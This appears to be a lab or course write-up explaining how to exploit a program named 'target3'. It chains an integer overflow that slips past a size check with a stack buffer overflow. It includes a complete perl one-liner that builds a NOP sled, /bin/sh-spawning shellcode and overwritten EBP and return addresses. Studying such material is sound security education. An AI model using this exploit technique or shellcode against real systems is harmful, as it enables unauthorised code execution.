This target has buffer overflow and integer overflow.

There are two part splitted by "," for the input value. The first part is a number 2147483849. This number will be -2147483447 when it compared with MAX_WIDGETS(200), since it is negative, it will pass the if statement.

The second part is a string contains nop sled, shellcode, and return address that we want it to return to.

Since we want to overwrite eip that is after the buffer address space, we will need a string at least buffer size+8. And because the code that control the size is " count * sizeof(struct widget_t) ", so we will need the count to be MAX_WIDGETS+1, which is 201, and this is the value 2147483849 will be seen as during calculation(the first 1 in the binary format will be ignored in that case).

So, we have a space of 201*16 = 3216 to fill up.

1. in the addr buf+3204, it is the place for eip, the return address, which is the probable buffer addr in this case.
(actually, it only need to be between buf and the start of shellcode.) 

2. in the addr buf+3200, it is the place for ebp, so put in something similar to ebp.
3. the shellcode, we put it before ebp, which is at buf+3155.
4. In order to fill up the buf, we put in nop sled in the rest space.

./target3 $(perl -e 'print "2147483849,";print "\x90"x3155; print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";  print "\xe8\xcc\xff\xbf"; print "\xe8\xe0\xff\xbf"; print "\x90"x8;')

| num, | nop sled (3155) | shellcode (45) |  ebp (4) | ret addr(4) | nop sled(8)

201 * (4+4+8) = 3216 = 3155 + 45 + 4 + 4 + 8 
                     = 3200      + 4 + 4 + 8




